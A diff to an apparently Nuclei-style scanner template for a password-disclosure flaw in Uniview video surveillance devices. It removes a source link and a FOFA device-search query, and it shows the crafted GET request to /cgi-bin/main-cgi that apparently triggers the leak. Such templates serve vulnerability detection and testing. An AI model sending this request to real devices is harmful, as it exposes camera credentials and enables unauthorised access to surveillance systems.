@@ -3,12 +3,8 @@ info:
   name: 宇视科技视频监控main-cgi密码泄露漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/fz4nx397m26lsmuc'
+  description: ''
   tags: info-leak,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: fz4nx397m26lsmuc
-    fofa: app="uniview-视频监控"
 http:
 - raw:
   - 'GET /cgi-bin/main-cgi?json={"cmd":255,"szUserName":"","u32UserLoginHandle":-1} HTTP/1.1
